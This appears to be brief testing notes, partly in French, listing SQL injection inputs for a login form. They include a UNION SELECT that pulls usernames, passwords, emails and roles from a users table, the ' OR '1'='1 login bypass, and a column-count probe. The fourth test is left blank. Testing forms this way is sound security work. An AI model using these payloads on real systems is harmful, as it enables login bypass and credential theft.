1. First test:  Union-based Injection

		*username*: ' UNION SELECT id, username, password,email,role,created\_at FROM users -- 

&nbsp;		password: 1234(Quelconque)

*2. Second test*: Injection Classique

		*username:* ' OR '1'='1

		*password:* ' OR '1'='1

3\. third test:	Union-based Injection(other)

		*username: ' UNION SELECT 1,2,3,4 ,5--* 

		*test: 1234(Quelconque)*

*4. fowr test:* 



